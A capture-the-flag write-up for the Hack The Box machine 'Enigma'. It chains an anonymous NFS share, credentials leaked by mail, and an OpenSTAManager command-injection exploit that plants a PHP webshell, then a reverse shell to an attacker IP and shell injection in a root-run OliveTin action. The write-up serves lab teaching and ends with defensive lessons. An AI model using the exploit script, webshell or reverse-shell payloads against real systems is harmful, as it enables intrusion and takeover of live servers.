# Enigma Hack The Box Writeup

## Machine Information

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **Machine Name** | Enigma |
| **OS** | Linux (Ubuntu) |
| **Category** | Web / Mail / Privilege Escalation |
| **Tags** | NFS, POP3S, OpenSTAManager, Command Injection, OliveTin, CVE-2025-69212 |

---

## Overview

Enigma chains together several different attack surfaces into one clean path an exposed NFS share, internal mail leaking credentials, a vulnerable CMS, and a misconfigured internal admin panel running as root. Each step feeds directly into the next, and password reuse shows up throughout the whole chain, which honestly made the whole thing quite satisfying to unravel.

---

## Enumeration

### Nmap

```bash
nmap -Pn -sSC 10.129.239.191 -v -n
```

The initial scan came back with a lot more open ports than you'd normally expect:

```
22/tcp   open  ssh
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  rpcbind
143/tcp  open  imap
993/tcp  open  imaps
995/tcp  open  pop3s
2049/tcp open  nfs_acl
```

HTTP on port `80` immediately redirected to `http://enigma.htb/`, so I added that to `/etc/hosts`. But honestly, what caught my eye right away was port `2049` that's **NFS**. NFS shares are always worth checking early because they're sometimes left open to everyone with no authentication at all. The mail ports (`110`, `143`, `993`, `995`) were also interesting a real internal mail server running Dovecot, all with self-signed certs under `CN=enigma`.

SSH was open too, but without credentials it wasn't immediately useful.

### NFS Enumeration

I checked what the NFS server was actually exporting:

```bash
showmount -e 10.129.239.191
```

```
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

That asterisk means the share is exported to **everyone** no IP restriction, no authentication. I mounted it immediately:

```bash
mkdir /tmp/enigma-nfs
sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/enigma-nfs
ls -la /tmp/enigma-nfs
```

```
-rw-r--r--  1 root root 1751 Feb 19 14:53 New_Employee_Access.pdf
```

One file. After opening the PDF, it turned out to be an onboarding document containing credentials for a new employee:

```
kevin:Enigma2024!
```

So I had a username and password right from the start. Now the question was where to use them.

### Mail Enumeration POP3S

SSH was the obvious first try, but that went nowhere the server only accepted public key authentication:

```bash
ssh kevin@10.129.239.191
# Permission denied (publickey).
```

Next up was the mail service. I tried plain POP3 on port `110` first, but Dovecot shut that down immediately:

```bash
telnet 10.129.239.191 110
USER kevin
# -ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
```

Makes sense the server enforces TLS for authentication. I switched to POP3S on port `995` using `openssl s_client` to handle the TLS handshake:

```bash
openssl s_client -connect 10.129.239.191:995 -quiet
```

```
+OK Dovecot (Ubuntu) ready.
USER kevin
+OK
PASS Enigma2024!
+OK Logged in.
LIST
+OK 1 messages:
1 1473
.
RETR 1
```

Kevin had one email, sent from `sarah@enigma.htb`. It was a welcome-to-the-company message from someone in Accounts, and one detail jumped out immediately:

> *"You should be receiving your access credentials shortly via the company shared drive."*

That confirmed the NFS share we'd already raided was exactly that shared drive. The email also introduced Sarah as Kevin's point of contact which meant I now had a second username to try. And given that `Enigma2024!` looked like a company-wide default credential, it was worth testing on her account too:

```bash
openssl s_client -connect 10.129.239.191:995 -quiet
USER sarah
PASS Enigma2024!
```

```
+OK Logged in.
```

Same password. Sarah's inbox had one email too, and it was far more valuable:

```
From: it@enigma.htb
Subject: Re: OpenSTAManager Access Request

Hi Sarah,

I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

A completely new set of credentials for an internal web application. I added `support_001.enigma.htb` to `/etc/hosts` and headed over there.

---

## Web Enumeration

### OpenSTAManager

The subdomain was running **OpenSTAManager 2.9.8** an open source ERP and help desk platform. Logging in with `admin:Ne3s4rtars78s` gave full admin access without any issues.

The version number was significant. OpenSTAManager 2.9.8 has a known command injection vulnerability tracked as **CVE-2025-69212**, which targets the ZIP file import feature. The exploit is publicly available and straightforward to weaponise.

---

## Initial Foothold

### CVE-2025-69212 Command Injection via Malicious ZIP Upload

The vulnerability lives in the file import plugin at `/plugins/importFE_ZIP/actions.php`. When you upload a ZIP containing an invoice file, OpenSTAManager extracts the filename and passes it to a shell command without sanitising special characters. That means you can break out of the command by injecting shell metacharacters directly into the filename.

I wrote a small Python script to build the payload:

```python
import zipfile

# payload write a PHP webshell into the files/ directory
cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"

# inject command through the filename by breaking out of the shell string
malicious_filename = f'invoice.p7m"; {cmd}; echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

The filename is the trick here. It starts like a valid `.p7m` invoice file, then breaks out with `"`, runs the injected command to write a PHP webshell into the web-accessible `files/` directory, and closes cleanly. The server ends up writing `SHELL.php` without knowing anything went wrong.

I uploaded the ZIP through the import endpoint:

```bash
curl -X POST http://support_001.enigma.htb/plugins/importFE_ZIP/actions.php \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
  -F "blob1=@exploit.zip" \
  -F "op=save" \
  -F "id_module=14" \
  -F "id_plugin=48"
```

Then tested the webshell:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command execution confirmed. I used the webshell to catch a reverse shell:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.99/4444+0>%261'"
```

That gave me a shell as `www-data` on the box.

---

## Privilege Escalation

### Step 1 Raiding the Config File

Inside the OpenSTAManager installation, the config file was the obvious first place to look for credentials:

```bash
cat config.inc.php | grep -i db_password
# $db_password = 'Fri3nds@9099';

cat config.inc.php | grep -i db_username
# $db_username = 'brollin';
```

I also checked which local users had a real login shell:

```bash
cat /etc/passwd | grep bash
```

```
root:x:0:0:root:/root:/bin/bash
haris:x:1000:1000:,,,:/home/haris:/bin/bash
```

One regular user: `haris`. Given how much password reuse we'd seen on this machine, I tried the database password as `haris`'s system account password:

```bash
su haris
Password: Fri3nds@9099
# su: Authentication failure
```

No luck this time. So I went into MySQL to see what else was in there:

```bash
mysql -u brollin -p
# Enter password: Fri3nds@9099
```

```sql
USE openstamanager;
SELECT id, username, password, email FROM zz_users;
```

```
+----+----------+--------------------------------------------------------------+------------------+
| id | username | password                                                     | email            |
+----+----------+--------------------------------------------------------------+------------------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |
+----+----------+--------------------------------------------------------------+------------------+
```

There's a bcrypt hash for `haris` in the application database, and there's a local user called `haris` on the system. People often reuse their application passwords as system passwords, so this was definitely worth cracking.

### Step 2 Cracking the Hash

Back on my attacking machine:

```bash
echo 'haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
bestfriends      (haris)
1g 0:00:00:11 DONE
```

Cracked in eleven seconds `haris:bestfriends`.

### Step 3 Getting SSH Access as Haris

From the `www-data` shell, I switched to `haris` using the cracked password and planted the public key:

```bash
su haris
# Password: bestfriends
mkdir -p ~/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICxjyiu1UTEuMGAxBqGCn3JK859bgj2W41FJFZDyWj/+ wakamiya@wakamiya' > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Now i had the `haris` shell, I generated a fresh SSH keypair on my attacking machine:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/enigma_haris -N ""
cat enigma_haris.pub
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICxjyiu1UTEuMGAxBqGCn3JK859bgj2W41FJFZDyWj/+ wakamiya@wakamiya
```

Now I could log in cleanly from my own machine:

```bash
ssh -i enigma_haris haris@10.129.15.215
```

```
Last login: Fri Jul  3 08:04:34 2026 from 10.10.15.99
haris@enigma:~$
```

---

## Root

### Discovering OliveTin on a Hidden Port

With a proper SSH session as `haris`, I started looking for the path to root. Checking internal listening ports quickly turned up something interesting:

```bash
ss -tlnp
```

```
LISTEN 0  4096  127.0.0.1:1337  0.0.0.0:*
```

Something was listening on localhost port `1337`. I checked what process it belonged to:

```bash
ps aux | grep -i olivetin
```

```
root  1547  0.0  0.3  1238736  15348 ?  Ssl  04:02  0:00 /usr/local/bin/OliveTin
```

**OliveTin** running as `root`. OliveTin is a web interface that lets you execute predefined shell commands through a browser. It's designed as a lightweight automation panel, and the fact that it was running as root while bound only to localhost invisible to the external Nmap scan made it a very promising escalation target.

The config file was world-readable:

```bash
cat /etc/OliveTin/config.yaml
```

The piece that mattered was this action definition:

```yaml
title: Backup Database
id: backup_database
shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
arguments:
  - name: db_user
    type: ascii_identifier
    default: backup_svc
  - name: db_pass
    type: password
  - name: db_name
    type: ascii_identifier
    default: production
```

The "Backup Database" action builds a shell command using user-supplied values. `db_user` and `db_name` are typed as `ascii_identifier`, which restricts the characters you can use. But `db_pass` is typed as `password` and if that field isn't sanitised before being dropped into the shell string, it's injectable.

The config also confirmed that no login was required to use the panel:

```yaml
defaultPermissions:
  view: true
  exec: true
  logs: true
```

Anyone who can reach the interface can run actions. We just needed to reach it.

### Port Forwarding to Access OliveTin

Since OliveTin was only listening on `127.0.0.1:1337` on the target, I tunnelled it to my local machine using SSH local port forwarding:

```bash
ssh -i enigma_haris haris@10.129.15.215 -L 1337:127.0.0.1:1337
```

This maps `localhost:1337` on my attacking machine to `127.0.0.1:1337` on the target. Opening `http://localhost:1337` in a browser brought up the OliveTin panel directly.

### Command Injection via db_pass

The "Backup Database" action produces this shell command:

```bash
mysqldump -u backup_svc -p'<db_pass>' production > /opt/backups/backup.sql
```

If I put this into the `db_pass` field:

```
'; cat /root/root.txt #
```

The resulting command becomes:

```bash
mysqldump -u backup_svc -p''; cat /root/root.txt #' production > /opt/backups/backup.sql
```

Breaking it down the `'` closes the password string, `;` ends the `mysqldump` call, then `cat /root/root.txt` runs as its own separate command with full root privileges. The `#` comments out everything that follows so the shell doesn't choke on the leftover syntax.

Clicking the button in OliveTin's UI triggered the action, and the root flag came back in the execution output.

---

## Flags

| Flag | Retrieved Via |
|---|---|
| **User flag** | `/home/haris/user.txt` |
| **Root flag** | `/root/root.txt` via OliveTin `db_pass` injection, executed as root |

---

## Attack Chain Summary

```
NFS anonymous mount (/srv/nfs/onboarding)
        │
        ▼
New_Employee_Access.pdf ──► kevin:Enigma2024!
        │
        ▼
POP3S as kevin ──► welcome email ──► sarah@enigma.htb identified
        │
        ▼
POP3S as sarah (same password reused) ──► IT email
        ──► support_001.enigma.htb / admin:Ne3s4rtars78s
        │
        ▼
OpenSTAManager 2.9.8 (CVE-2025-69212)
Malicious ZIP ──► PHP webshell ──► reverse shell as www-data
        │
        ▼
config.inc.php ──► brollin:Fri3nds@9099
        │
        ▼
MySQL ──► haris bcrypt hash
        │
        ▼
John the Ripper ──► bestfriends
        │
        ▼
su haris ──► write authorized_keys ──► SSH as haris
        │
        ▼
ss -tlnp ──► port 1337 (OliveTin, running as root)
        │
        ▼
SSH port forward ──► browser access to OliveTin
        │
        ▼
Backup Database action ──► db_pass injection
        ──► cat /root/root.txt  ──► ROOT
```

---

## Lessons Learned

**Unrestricted NFS exports are a serious risk.** The `/srv/nfs/onboarding` share was exported to `*`, meaning anyone on the network could mount it with no credentials. That one misconfiguration handed over the credential that started the entire chain.

**Internal mail servers leak a lot.** Reading emails gave me not just credentials but also a map of the internal infrastructure hostnames, application URLs, usernames, and context about what systems exist. After getting into one mail account, checking a second account with the same password led directly to the CMS login. Always read the emails.

**Password reuse compounds risk.** The pattern here was `Enigma2024!` as a default credential, then application passwords reused as system account passwords. Every new credential found should be tested against every available service before moving on.

**Bcrypt is strong but the password still matters.** The hash for `haris` used bcrypt with a cost factor of 1024, which is decent but `bestfriends` was in rockyou.txt and John cracked it in eleven seconds on two threads. The algorithm is only as strong as the password underneath it.

**Always check internal ports after getting a foothold.** OliveTin was completely invisible to the external Nmap scan because it was bound to `127.0.0.1` only. A quick `ss -tlnp` after getting a shell revealed it immediately. Anything running on an internal port as root deserves a very close look.

**Type restrictions in OliveTin actions don't automatically mean safe.** The `ascii_identifier` type on `db_user` and `db_name` would have blocked injection there, but `password` type on `db_pass` didn't apply the same restrictions, and its value was dropped directly into a shell string. User input going into shell commands needs to be sanitised at the shell level, not just at the form level.

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port and service discovery |
| showmount | NFS share enumeration |
| openssl s_client | POP3S interaction over TLS |
| telnet | Initial POP3 probe |
| Python (`zipfile`) | Building the malicious ZIP for CVE-2025-69212 |
| curl | Uploading the exploit, testing the webshell |
| netcat | Catching the reverse shell |
| mysql client | Database enumeration |
| John the Ripper | Cracking the bcrypt hash |
| SSH (`-L` flag) | Local port forwarding to reach OliveTin |
| OliveTin web UI | Delivering the command injection payload |
